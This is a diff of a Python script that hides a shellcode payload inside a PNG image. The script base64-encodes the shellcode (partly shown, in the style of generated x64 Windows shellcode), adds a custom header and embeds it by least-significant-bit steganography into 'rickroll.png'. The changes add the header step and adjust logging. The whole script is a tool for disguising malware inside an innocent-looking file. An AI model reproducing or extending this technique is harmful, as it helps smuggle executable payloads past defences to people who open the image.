@@ -1,4 +1,4 @@
-from stego_embed import *
+from embed import *
 payload = b""
 payload += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00"
 payload += b"\x00\x41\x51\x41\x50\x52\x48\x31\xd2\x65\x48\x8b"
@@ -31,17 +31,18 @@ payload += b"\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5"
 
 #  Base64 encode the bytes
 encoded = encode_payload(payload)
-print(len(encoded))
+
 # Convert Base64 string to bytes
 encoded_bytes = string_to_bytes(encoded)
 
+final_payload = add_custom_header(encoded_bytes)
+print(final_payload)
 #  Bitstring for embedding
-bitstring = to_bitstring(encoded_bytes)
+bitstring = to_bitstring(final_payload)
 
 #  Embed
 embed_payload_in_lsb("../rickroll.png", bitstring, "stego_output.png")
 
 # Logs
-print(encoded)
 print(f"Encoded base64 payload: {encoded}")
 print(f"Byte length: {len(encoded_bytes)}")
